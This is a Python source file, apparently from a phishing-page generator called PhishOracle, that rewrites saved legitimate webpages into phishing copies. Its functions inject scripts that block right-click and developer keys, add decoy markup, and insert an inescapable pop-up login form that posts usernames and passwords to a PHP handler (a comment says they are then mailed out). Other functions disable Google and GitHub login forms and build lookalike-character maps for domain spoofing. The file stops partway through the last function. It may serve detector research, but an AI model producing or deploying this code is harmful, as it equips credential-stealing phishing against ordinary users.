import os
import random
import time

import requests
from bs4 import BeautifulSoup
import urllib.request
import webbrowser
import copy
import re
from urllib.parse import urlparse
import pandas as pd

'''
=======================================    PHASE 3 (FUNCTION 1) BEGINS HERE  =======================================
In this function, we create an anchor tag with empty content
<a href="#">
<a href="#content">
<a href="#skip">
<a href="javascript::void(0)">
'''

csv_file = 'legitimate_urls_with_index.csv'
phishing_folder_path = "E:\\Complete_Python\\_PhishOracle_Webapp\\Phishing_Webpage\\"
legitimate_folder_path = "E:\\Complete_Python\\_PhishOracle_Webapp\\"


def function_1(target_file, obtained_soup_here):
    print("Adding feature <a href=\"#\">")

    # legitimate_sites_folder = "\\xampp\\htdocs\\phishingTool\\LegitimatePages\\"
    # open_this = os.path.join("c:" + legitimate_sites_folder, str(target_file) + ".html")

    # with open(open_this, 'rb') as f_1_input:
    #     function_1_contents = f_1_input.read()
    #     f1_soup = BeautifulSoup(function_1_contents, 'lxml')
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))

    f1_soup = obtained_soup_here
    for el in f1_soup.find_all("a"):
        href_choice = ['#', '#content', '#skip', 'Javascript:void(0)']
        el["href"] = random.choice(href_choice)
        el["onclick"] = ""

    function_1_soup = copy.deepcopy(f1_soup.prettify())

    # write_file = "\\xampp\\htdocs\\phishingTool\\PhishingSites\\"
    # write_file_name = os.path.join("c:" + write_file, str(target_file) + ".html")

    with open(write_file_name, 'w', encoding='utf-8') as f_1_output:
        f_1_output.write(str(function_1_soup))


'''
========================================    PHASE 3 (FUNCTION 1) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 2) BEGINS HERE  =======================================
In this feature, we disable the right click and CTRL options from viewing any source code content

Add attribute 'oncontextmenu="return false;"' in the body tag to disable the right click of the webpage
If wanted we can add an alert message if right clicked using javascript
javascript_code_to_append_for_alert = \'''
<script type="text/javascript"> 
function no_right_click() 
{ 
alert("Right click is not allowed for this page"); 
return false; 
} 
</script> 
\'''
and in the tag body the attribute should be 'oncontextmenu="return no_right_click();"'
'''


def function_2(target_file):
    print("Adding feature 'Disabling Right Click, Fn key and CTRL key'")

    legitimate_sites_folder = legitimate_folder_path
    open_this = os.path.join(legitimate_sites_folder, str(target_file))

    # Disabling right click

    with open(open_this, 'rb') as f_2_input:
        function_2_contents = f_2_input.read()
        f2_soup = BeautifulSoup(function_2_contents, 'lxml')

        if f2_soup.find("body"):

            body_tag = f2_soup.body
            body_tag['onkeypress'] = "return disableCtrlKeyCombination(event);"
            body_tag['onkeydown'] = "return disableCtrlKeyCombination(event);"
            # body_tag['oncontextmenu'] = "return false;"

            disable_tag = f2_soup.new_tag('script')
            disable_tag['language'] = "JavaScript"
            disable_tag['type'] = "text/javascript"
            disable_tag.string = '''document.onkeypress = function (event) {
            event = (event || window.event);
            if (event.keyCode == 123) {
               //alert('No F-12');
                return false;
            }
        }
        document.onmousedown = function (event) {
            event = (event || window.event);
            if (event.keyCode == 123) {
                //alert('No F-keys');
                return false;
            }
        }
    document.onkeydown = function (event) {
            event = (event || window.event);
            if (event.keyCode == 123) {
                //alert('No F-keys');
                return false;
            }
        }
    function clickIE() {if (document.all) {return false;}}
    function clickNS(e) {if
    (document.layers||(document.getElementById&&!document.all)) {
    if (e.which==2||e.which==3) {(message);return false;}}}
    if (document.layers)
    {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
    else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
    document.oncontextmenu=new Function("return false")
    //
    function disableCtrlKeyCombination(e)
    {
    //list all CTRL + key combinations you want to disable
    var forbiddenKeys = new Array('a', 'n', 'c', 'x', 'v', 'j' , 'w', 'u');
    var key;
    var isCtrl;
    if(window.event)
    {
    key = window.event.keyCode;     //IE
    if(window.event.ctrlKey)
    isCtrl = true;
    else
    isCtrl = false;
    }
    else
    {
    key = e.which;     //firefox
    if(e.ctrlKey)
    isCtrl = true;
    else
    isCtrl = false;
    }
    //if ctrl is pressed check if other key is in forbidenKeys array
    if(isCtrl)
    {
    for(i=0; i<forbiddenKeys.length; i++)
    {
    //case-insensitive comparation
    if(forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase())
    {
    <!--alert('Key combination CTRL + '+String.fromCharCode(key) +' has been disabled.');-->
    return false;
    }
    }
    }
    return true;
    }
            '''
            f2_soup.html.head.append(disable_tag)

        else:
            new_html_tag = f2_soup.new_tag('html')
            new_body_tag = f2_soup.new_tag('body')
            new_body_tag['onkeypress'] = "return disableCtrlKeyCombination(event);"
            new_body_tag['onkeydown'] = "return disableCtrlKeyCombination(event);"
            # body_tag['oncontextmenu'] = "return false;"

            disable_tag = f2_soup.new_tag('script')
            disable_tag['language'] = "JavaScript"
            disable_tag['type'] = "text/javascript"
            disable_tag.string = '''document.onkeypress = function (event) {
                        event = (event || window.event);
                        if (event.keyCode == 123) {
                           //alert('No F-12');
                            return false;
                        }
                    }
                    document.onmousedown = function (event) {
                        event = (event || window.event);
                        if (event.keyCode == 123) {
                            //alert('No F-keys');
                            return false;
                        }
                    }
                document.onkeydown = function (event) {
                        event = (event || window.event);
                        if (event.keyCode == 123) {
                            //alert('No F-keys');
                            return false;
                        }
                    }
                function clickIE() {if (document.all) {return false;}}
                function clickNS(e) {if
                (document.layers||(document.getElementById&&!document.all)) {
                if (e.which==2||e.which==3) {(message);return false;}}}
                if (document.layers)
                {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
                else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
                document.oncontextmenu=new Function("return false")
                //
                function disableCtrlKeyCombination(e)
                {
                //list all CTRL + key combinations you want to disable
                var forbiddenKeys = new Array('a', 'n', 'c', 'x', 'v', 'j' , 'w', 'u');
                var key;
                var isCtrl;
                if(window.event)
                {
                key = window.event.keyCode;     //IE
                if(window.event.ctrlKey)
                isCtrl = true;
                else
                isCtrl = false;
                }
                else
                {
                key = e.which;     //firefox
                if(e.ctrlKey)
                isCtrl = true;
                else
                isCtrl = false;
                }
                //if ctrl is pressed check if other key is in forbidenKeys array
                if(isCtrl)
                {
                for(i=0; i<forbiddenKeys.length; i++)
                {
                //case-insensitive comparation
                if(forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase())
                {
                <!--alert('Key combination CTRL + '+String.fromCharCode(key) +' has been disabled.');-->
                return false;
                }
                }
                }
                return true;
                }
                        '''
            f2_soup.html.head.append(disable_tag)

    import copy

    function_2_soup = copy.deepcopy(f2_soup.prettify())

    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))

    with open(write_file_name, 'w', encoding='utf-8') as f_2_output:
        f_2_output.write(str(function_2_soup))


'''
========================================    PHASE 3 (FUNCTION 2) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 3) BEGINS HERE  =======================================
In this feature we add dummy comments
'''


def function_3(target_file, obtained_soup_here):
    print("Adding feature 'Comments'")
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_3_input:
    #     function_3_contents = f_3_input.read()
    #     f3_soup = BeautifulSoup(function_3_contents, 'html.parser')
    # comment_line = '''<b><!-- Comment Here --></b>'''
    # break_tag = f3_soup.new_tag('br')
    # break_tag.string = comment_line
    # # f3_soup.html.body.append(break_tag)
    # f3_soup.html.body.append(comment_line)

    f3_soup = obtained_soup_here
    comment_strings = ['''<b><!-- This code is used to get credentials --></b>''',
                       '''<b><!-- The following code redirects to login page --></b>''',
                       '''<b><!-- Code for adding username and password --></b>''']
    for i in range(5):
        comment_line_addition = random.choice(comment_strings)
        f3_soup.html.body.append(BeautifulSoup(comment_line_addition, 'html.parser'))
        f3_soup.prettify()

    # with open(write_file_name, 'a', encoding='utf-8') as f_3_comment:
    #     f_3_comment.write(comment_line)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_3_soup = copy.deepcopy(f3_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_3_output:
        f_3_output.write(str(function_3_soup))


'''
========================================    PHASE 3 (FUNCTION 3) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 4) BEGINS HERE  =======================================
Add dummy div tags with visibility:hidden
'''


def function_4(target_file, obtained_soup_here):
    print("Adding feature 'Dummy div tags'")

    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_4_input:
    #     function_4_contents = f_4_input.read()
    #     f4_soup = BeautifulSoup(function_4_contents, 'html.parser')

    f4_soup = obtained_soup_here

    for i in range(0, 10):
        additional_div_tags = f4_soup.new_tag("div")
        additional_div_tags.string = "Here is the dummy text " + str(i) + " added in the body of the html file"
        if additional_div_tags.has_attr('style'):
            div_styles_present = additional_div_tags['style']
            div_additional_styling = div_styles_present + "visibility: hidden;"
            additional_div_tags['style'] = div_additional_styling
        else:
            additional_div_tags['style'] = "visibility: hidden;"

        f4_soup.html.body.append(additional_div_tags)

    '''
    Copy the contents to the file from the updates made from the soup to add dummy div tags
    '''
    import copy

    function_4_soup = copy.deepcopy(f4_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_4_output:
        f_4_output.write(str(function_4_soup))


'''
========================================    PHASE 3 (FUNCTION 4) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 5) BEGINS HERE  =======================================
Add dummy script tags in head and body tag
'''


def function_5(target_file, obtained_soup_here):
    print("Adding feature 'Dummy script tags'")

    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_5_input:
    #     function_5_contents = f_5_input.read()
    #     f5_soup = BeautifulSoup(function_5_contents, 'html.parser')
    f5_soup = obtained_soup_here
    script_tags_src = ["myScripts.js", "Scripts.js", "scripts.js", "Scripts/script.js", "scriptFolder/script.js"]

    for i in range(0, 5):
        additional_script_tags = f5_soup.new_tag("script")
        additional_script_tags['type'] = "text/javascript"
        additional_script_tags['src'] = random.choice(script_tags_src)
        f5_soup.html.head.append(additional_script_tags)

    for i in range(0, 5):
        additional_script_tags = f5_soup.new_tag("script")
        additional_script_tags['type'] = "text/javascript"
        additional_script_tags['src'] = random.choice(script_tags_src)
        f5_soup.html.body.append(additional_script_tags)

    '''
    Copy the contents to the file from the updates made from the soup to add dummy script tags
    '''
    import copy

    function_5_soup = copy.deepcopy(f5_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_5_output:
        f_5_output.write(str(function_5_soup))


'''
========================================    PHASE 3 (FUNCTION 5) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 6) BEGINS HERE  =======================================
Add dummy link tags in head tag
'''


def function_6(target_file, obtained_soup_here):
    print("Adding feature 'Dummy link tags'")

    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_6_input:
    #     function_6_contents = f_6_input.read()
    #     f6_soup = BeautifulSoup(function_6_contents, 'html.parser')

    f6_soup = obtained_soup_here
    styling_directory = ["style.css", "Styles/styling.css", "styleFolder/styleCSS.css"]

    for i in range(0, 5):
        additional_link_tag = f6_soup.new_tag("link")
        additional_link_tag['rel'] = "stylesheet"
        additional_link_tag['type'] = "text/css"
        additional_link_tag['href'] = random.choice(styling_directory)
        if additional_link_tag.has_attr('style'):
            link_styles_present = additional_link_tag['style']
            link_additional_styling = link_styles_present + "display: none;"
            additional_link_tag['style'] = link_additional_styling
        else:
            additional_link_tag['style'] = "display: none;"
        f6_soup.html.head.append(additional_link_tag)

    '''
    Copy the contents to the file from the updates made from the soup to add dummy link tags
    '''
    import copy

    function_6_soup = copy.deepcopy(f6_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_6_output:
        f_6_output.write(str(function_6_soup))


'''
========================================    PHASE 3 (FUNCTION 6) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 7) BEGINS HERE  =======================================
In this feature we add opacity to the body tag to make it blur
'''


def function_7(target_file, obtained_soup_here):
    print("Adding feature 'Body opacity'")

    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_7_input:
    #     function_7_contents = f_7_input.read()
    #     f7_soup = BeautifulSoup(function_7_contents, 'html.parser')

    f7_soup = obtained_soup_here
    if f7_soup.html.body.has_attr('style'):
        body_styles_present = f7_soup.html.body['style']
        body_additional_styling = body_styles_present + "opacity: 0.8;"
        f7_soup.html.body['style'] = body_additional_styling
    else:
        f7_soup.html.body['style'] = "opacity:0.7;"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_7_soup = copy.deepcopy(f7_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_7_output:
        f_7_output.write(str(function_7_soup))


'''
========================================    PHASE 3 (FUNCTION 7) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 8) BEGINS HERE  =======================================
In this feature we pop-up the login form with out cross mark on the form to ensure the credentials are entered by the target
Then, the inputs are saved in a .txt file to mail credentials using send_mail_inputs.py
'''


def function_8(target_file, obtained_soup_here):
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_8_input:
    #     function_8_contents = f_8_input.read()
    #     f8_soup = BeautifulSoup(function_8_contents, 'html.parser')

    f8_soup = obtained_soup_here

    if f8_soup.find('form'):
        print("Adding feature 'Pop-up Login'")
        for form_element in f8_soup.find_all("form"):
            form_element["action"] = ""
        # div_tag = soup.form.div
        # div_tag.decompose()
        [input_tag.extract() for input_tag in f8_soup.findAll('input')]
        [label_tag.clear() for label_tag in f8_soup.findAll('label')]
        # for input_tag in soup.find_all('input'):
        #     input_tag['style'] = "background: transparent; border:none;"
        # soup.find('input').decompose()
        # for input_tag in soup.find_all('input'):
        #     input_tag['type'] = "hidden"
        # soup.find("button")['id'] = "loginButton"

        # pop_up_button = soup.new_tag("button")
        for button_change in f8_soup.find_all('button'):
            button_change['class'] = "_button"
            button_change['href'] = "#"
            button_change['onclick'] = "show('popup')"
        # soup.html.body.append(pop_up_button)

        # pop_up_div_tag_add = soup.new_tag("div")
        pop_up_div_tag_add_string = '''<div class="popup" id="popup">
                                            <div class="center">
                                                <div class="container">
                                                    <div class="text">Login Form</div>
                                                    <form action="get_form_inputs.php" method="post">
                                                        <div class="data"><label>Email or Phone</label>
                                                            <input type="text" name="user_name" required>
                                                        </div>
                                                        <div class="data"><label>Password</label>
                                                            <input type="password" name="user_password" required>
                                                        </div>
                                                        <div class="forgot-pass"><a href="#">Forgot Password?</a></div>
                                                        <div class="btn">
                                                            <div class="inner"></div>
                                                            <button type="submit" name="submit" onclick="handler(onkeydown)">Login</button>
                                                        </div>
                                                        <div class="signup-link">Not a member? <a href="#">Signup now</a></div>
                                                    </form>
                                                </div>
                                            </div>
                                        </div>'''
        f8_soup.html.body.append(BeautifulSoup(pop_up_div_tag_add_string, 'html.parser'))
        f8_soup.prettify()

        script_tag_for_pop_up = f8_soup.new_tag("script")
        script_tag_for_pop_up.string = '''$ = function(id) {return document.getElementById(id);}
        var show = function(id){$(id).style.display ='block';}
        var hide = function(id) {	$(id).style.display ='none';}'''
        f8_soup.html.body.append(script_tag_for_pop_up)

        style_tag_for_pop_up = f8_soup.new_tag("style")
        style_tag_for_pop_up.string = '''.container{position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);}
                                        input[type="checkbox"]{display: none;}
                                        .container{background: #fff;width: 410px;padding: 30px;box-shadow: 0 0 8px rgba(0,0,0,0.1);}
                                        .container .text{font-size: 35px;font-weight: 600;text-align: center;}
                                        .container form{margin-top: -20px;}
                                        .container form .data{height: 45px;width: 100%;margin: 40px 0;}
                                        form .data label{font-size: 18px;}
                                        form .data input{height: 100%;width: 100%;padding-left: 10px;font-size: 17px;border: 1px solid silver;}
                                        form .data input:focus{border-color: #3498db;border-bottom-width: 2px;}
                                        form .forgot-pass{margin-top: -8px;}
                                        form .forgot-pass a{color: #3498db;text-decoration: none;}
                                        form .forgot-pass a:hover{text-decoration: underline;}
                                        form .btn{margin: 30px 0;height: 45px;width: 100%;position: relative;overflow: hidden;}
                                        form .btn .inner{height: 100%;width: 300%;position: absolute;left: -100%;z-index: -1;background: -webkit-linear-gradient(right, #512122, #31ac15, #255a21, #3020a0);transition: all 0.4s;}
                                        form .btn:hover .inner{left: 0;}
                                        form .btn button{height: 100%;width: 100%;background: none;border: none;color: #fff;font-size: 18px;font-weight: 500;text-transform: uppercase;letter-spacing: 1px;cursor: pointer;}
                                        form .signup-link{text-align: center;}
                                        form .signup-link a{color: #3498db;text-decoration: none;}
                                        form .signup-link a:hover{text-decoration: underline;}
                                        .popup {display: none;position: fixed;padding: 10px;width: 500px;left: 40%;margin-left: -100px;height: 500px;top: 20%;margin-top: -100px;background: #FFF;border: 3px solid #4e4a4a;z-index: 20;}
                                        #popup:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
                                        #popup:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
                                        /* Styling buttons & webpage */
                                        ._button {margin-top: 50px;background-color: rgba(255,255,255,0.3);border: 3px solid #595757;color: #4a4545;font-size: 25px;padding: 10px 20px;}
                                        ._button:hover {background-color: #563e3e;color: #FFF;border: 3px solid #9a7373;transition: all 0.3s ease 0s;}
                                        p {margin: 1em 0;font-size: 16px;}
                                        .popupk {display: none;position: fixed;padding: 10px;width: 500px;left: 50%;margin-left: -150px;height: 500px;top: 50%;margin-top: -100px;background: #FFF;border: 3px solid #876565;z-index: 20;}
                                        #popupk:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
                                        #popupk:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
                                        /* Styling buttons & webpage */
                                        body {background: offwhite;font-family: Arial, sans-serif;text-align: center;}
                                        ._button {margin-top: 10px;background-color: rgba(255,255,255,0.3);border: 1.5px solid #534242;color: #3e3939;font-size: 15px;padding: 5px 10px;}
                                        ._button:hover {background-color: #473f3f;color: #FFF;border: 3px solid #6a5b5b;transition: all 0.3s ease 0s;}
                                        p {margin: 1em 0;font-size: 16px;}'''
        f8_soup.html.head.append(style_tag_for_pop_up)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_8_soup = copy.deepcopy(f8_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_8_output:
        f_8_output.write(str(function_8_soup))


'''
========================================    PHASE 3 (FUNCTION 8) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 9) BEGINS HERE  =======================================
In this feature we add dummy images with visibility:hidden or display:none
'''


def function_9(target_file, obtained_soup_here):
    print("Adding feature 'Dummy image with no display'")

    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_9_input:
    #     function_9_contents = f_9_input.read()
    #     f9_soup = BeautifulSoup(function_9_contents, 'html.parser')

    f9_soup = obtained_soup_here

    for i in range(0, 5):
        image_tag = f9_soup.new_tag('img')
        image_tag['src'] = "dummy_image.png"
        image_tag['alt'] = ""
        if image_tag.has_attr('style'):
            image_styles_present = image_tag['style']
            if "display:none;" not in image_styles_present:
                image_additional_styling = image_styles_present + "display:none;"
                image_tag['style'] = image_additional_styling
        else:
            image_tag['style'] = "display:none;"
        f9_soup.html.body.append(image_tag)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_9_soup = copy.deepcopy(f9_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_9_output:
        f_9_output.write(str(function_9_soup))


'''
========================================    PHASE 3 (FUNCTION 9) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 10) BEGINS HERE  =======================================
In this feature we add a set of dummy anchor tags and few redirect to the same web page and others are disabled
'''


def function_10(target_file, obtained_soup_here):
    print("Adding feature 'Dummy anchor tags with few of redirecting and few disabled'")
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_10_input:
    #     function_10_contents = f_10_input.read()
    #     f10_soup = BeautifulSoup(function_10_contents, 'html.parser')

    f10_soup = obtained_soup_here

    # Find all the anchor tags in the HTML
    anchors = f10_soup.find_all("a")

    for i, anchor in enumerate(anchors):
        # Create a new anchor tag with the desired attributes
        new_anchor = f10_soup.new_tag("a", href="#")
        new_anchor.string = random.choice(
            ['Find Us', 'Enter Credentials', 'Login for more', 'Reach Us', 'Contact Us', 'Mail Us',
             'Login To Know More'])
        new_anchor['style'] = "text-decoration:none;"
        new_anchor['style'] = "text-decoration:none;"
        # Insert the new anchor tag after the current anchor tag
        anchor.insert_after(new_anchor)

    pop_up_div_tag_add_string = '''<div class="popup" id="popup">
                                                    <div class="center">
                                                        <div class="container">
                                                            <div class="text">Login Form</div>
                                                            <form action="get_form_inputs.php" method="post">
                                                                <div class="data"><label>Email or Phone</label>
                                                                    <input type="text" name="user_name" required>
                                                                </div>
                                                                <div class="data"><label>Password</label>
                                                                    <input type="password" name="user_password" required>
                                                                </div>
                                                                <div class="forgot-pass"><a href="#">Forgot Password?</a></div>
                                                                <div class="btn">
                                                                    <div class="inner"></div>
                                                                    <button type="submit" name="submit" onclick="handler(onkeydown)">Login</button>
                                                                </div>
                                                                <div class="signup-link">Not a member? <a href="#">Signup now</a></div>
                                                            </form>
                                                        </div>
                                                    </div>
                                                </div>'''
    f10_soup.html.body.append(BeautifulSoup(pop_up_div_tag_add_string, 'html.parser'))
    f10_soup.prettify()

    script_tag_for_pop_up = f10_soup.new_tag("script")
    script_tag_for_pop_up.string = '''$ = function(id) {return document.getElementById(id);}
                var show = function(id){$(id).style.display ='block';}
                var hide = function(id) {	$(id).style.display ='none';}'''
    f10_soup.html.body.append(script_tag_for_pop_up)

    style_tag_for_pop_up = f10_soup.new_tag("style")
    style_tag_for_pop_up.string = '''.container{position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);}
                                                input[type="checkbox"]{display: none;}
                                                .container{background: #fff;width: 410px;padding: 30px;box-shadow: 0 0 8px rgba(0,0,0,0.1);}
                                                .container .text{font-size: 35px;font-weight: 600;text-align: center;}
                                                .container form{margin-top: -20px;}
                                                .container form .data{height: 45px;width: 100%;margin: 40px 0;}
                                                form .data label{font-size: 18px;}
                                                form .data input{height: 100%;width: 100%;padding-left: 10px;font-size: 17px;border: 1px solid silver;}
                                                form .data input:focus{border-color: #3498db;border-bottom-width: 2px;}
                                                form .forgot-pass{margin-top: -8px;}
                                                form .forgot-pass a{color: #3498db;text-decoration: none;}
                                                form .forgot-pass a:hover{text-decoration: underline;}
                                                form .btn{margin: 30px 0;height: 45px;width: 100%;position: relative;overflow: hidden;}
                                                form .btn .inner{height: 100%;width: 300%;position: absolute;left: -100%;z-index: -1;background: -webkit-linear-gradient(right, #512122, #31ac15, #255a21, #3020a0);transition: all 0.4s;}
                                                form .btn:hover .inner{left: 0;}
                                                form .btn button{height: 100%;width: 100%;background: none;border: none;color: #fff;font-size: 18px;font-weight: 500;text-transform: uppercase;letter-spacing: 1px;cursor: pointer;}
                                                form .signup-link{text-align: center;}
                                                form .signup-link a{color: #3498db;text-decoration: none;}
                                                form .signup-link a:hover{text-decoration: underline;}
                                                .popup {display: none;position: fixed;padding: 10px;width: 500px;left: 40%;margin-left: -100px;height: 500px;top: 20%;margin-top: -100px;background: #FFF;border: 3px solid #4e4a4a;z-index: 20;}
                                                #popup:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
                                                #popup:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
                                                /* Styling buttons & webpage */
                                                ._button {margin-top: 50px;background-color: rgba(255,255,255,0.3);border: 3px solid #595757;color: #4a4545;font-size: 25px;padding: 10px 20px;}
                                                ._button:hover {background-color: #563e3e;color: #FFF;border: 3px solid #9a7373;transition: all 0.3s ease 0s;}
                                                p {margin: 1em 0;font-size: 16px;}
                                                .popupk {display: none;position: fixed;padding: 10px;width: 500px;left: 50%;margin-left: -150px;height: 500px;top: 50%;margin-top: -100px;background: #FFF;border: 3px solid #876565;z-index: 20;}
                                                #popupk:after {position: fixed;content: "";top: 0;left: 0;bottom: 0;right: 0;background: rgba(0,0,0,0.5);z-index: -2;}
                                                #popupk:before {position: absolute;content: "";top: 0;left: 0;bottom: 0;right: 0;background: #FFF;z-index: -1;}
                                                /* Styling buttons & webpage */
                                                body {background: offwhite;font-family: Arial, sans-serif;text-align: center;}
                                                ._button {margin-top: 10px;background-color: rgba(255,255,255,0.3);border: 1.5px solid #534242;color: #3e3939;font-size: 15px;padding: 5px 10px;}
                                                ._button:hover {background-color: #473f3f;color: #FFF;border: 3px solid #6a5b5b;transition: all 0.3s ease 0s;}
                                                p {margin: 1em 0;font-size: 16px;}'''
    f10_soup.html.head.append(style_tag_for_pop_up)

    # # Update the HTML with the changes
    # new_html = str(f10_soup)
    #
    # # Save the updated HTML to a file
    # with open("updated_html.html", "w") as f:
    #     f.write(new_html)
    #
    # print("Updated HTML saved to updated_html.html")
    #
    # for i in range(0, 5):
    #     disabled_anchor_tags = f10_soup.new_tag("a")
    #     disabled_anchor_tags['href'] = "#"
    #     disabled_anchor_tags.string = random.choice(['Find Us', 'Enter Credentials', 'Login for more'])
    #     # disabled_anchor_tags['style'] = "cursor: not-allowed; pointer-events:none; text-decoration:none;"
    #     f10_soup.html.body.append(disabled_anchor_tags)
    #
    # anchor_tag_strings = ['Reach Us', 'Contact Us', 'Mail Us', 'Login To Know More']
    # for i in range(0, 5):
    #     enabled_anchor_tags = f10_soup.new_tag("a")
    #     enabled_anchor_tags['href'] = target_file
    #     enabled_anchor_tags.string = random.choice(anchor_tag_strings)
    #     enabled_anchor_tags['style'] = "text-decoration:none;"
    #     f10_soup.html.body.append(enabled_anchor_tags)

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_10_soup = copy.deepcopy(f10_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_10_output:
        f_10_output.write(str(function_10_soup))


'''
========================================    PHASE 3 (FUNCTION 10) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 11) BEGINS HERE  =======================================
In this feature we disable other login buttons if present for login
'''


def function_11(target_file, obtained_soup_here):
    print("Add feature 'Disable other login buttons'")
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))
    #
    # with open(write_file_name, 'rb') as f_10_input:
    #     function_10_contents = f_10_input.read()
    #     f10_soup = BeautifulSoup(function_10_contents, 'html.parser')

    f11_soup = obtained_soup_here
    github_link = f11_soup.find("form", action="https://github.com/login")
    google_link = f11_soup.find("form", action="https://accounts.google.com/login")

    if github_link:
        remove_github_href = f11_soup.find("form", action="https://github.com/login")
        remove_github_href['href'] = "#"
    if google_link:
        remove_google_href = f11_soup.find("form", action="https://accounts.google.com/login")
        remove_google_href['href'] = "#"

    '''
    Copy the contents of the downloaded html file soup to another soup using 'copy.deepcopy()' method and create new html file
    '''
    import copy

    function_11_soup = copy.deepcopy(f11_soup.prettify())

    with open(write_file_name, 'w', encoding='utf-8') as f_11_output:
        f_11_output.write(str(function_11_soup))


'''
========================================    PHASE 3 (FUNCTION 11) ENDS HERE  ========================================
'''

'''
=======================================    PHASE 3 (FUNCTION 12) BEGINS HERE  =======================================
In this feature we find and replace the domain name with look alike characters
'''


def function_12(target_file, obtained_soup_here):
    print("Adding feature 'Look Alike characters'")
    write_file = phishing_folder_path
    write_file_name = os.path.join(write_file, str(target_file))

    character_a = ['ä', 'ẚ', 'á', 'ầ', 'ā', 'ä']
    character_b = ['b̀', 'b̂', 'b̃', 'ḇ̂', 'b̤', 'b̥']
    character_c = ['c̀', 'ć', 'c̃', 'c̈', 'ċ', 'c̓']
    character_d = ['d̊', 'd́', 'ď', 'ḑ', 'đ', 'd̥']
    character_e = ['è', 'ê', 'ē', 'ė', 'ë', 'e̊']
    character_i = ['í', 'ǐ', 'i̎', 'ḭ', 'ị']
    character_o = ['ó', 'ò', 'ṓ', 'ö', 'o̍']

    look_alike_characters = {'a': random.choice(character_a),
                             'b': random.choice(character_b),
                             'c': random.choice(character_c),
                             'd': random.choice(character_d),
                             'e': random.choice(character_e),
                             'f': 'f̣', 'g': 'g̈', 'h': 'ḥ', 'i': random.choice(character_i),
                             'j': 'j́', 'k': 'k̥', 'l': 'l̩̓', 'm': 'm̍', 'n': 'ņ',
                             'o': random.choice(character_o), 'p': 'p̣', 'q': 'q̣', 'r': 'ṛ', 's': 'ś',
                             't': 'ṫ', 'u': 'u̇', 'v': 'v̓', 'w': 'ẉ', 'x': 'ẋ', 'y': 'ý', 'z': 'ẓ̣'}

    # with open(write_file_name, 'rb') as f_12_input:
    #     function_12_contents = f_12_input.read()
    #     f12_soup = BeautifulSoup(function_12_contents, 'html.parser')

    # for a in f12_soup.findAll('a'):
    #     href_value = str(a['href'])
    #     char_in_href = href_value[0]
    #     replaced_char = ''
    #     for key in look_alike_characters:
    #         if key == char_in_href:
    #             replaced_char += look_alike_characters[key]
    #
    #     new_href_name = href_value.replace(char_in_href, replaced_char)
    #     a['href'] = new_href_name

    f12_soup = obtained_soup_here
    # for anchor_tag in f12_soup.find_all('a', href=True):
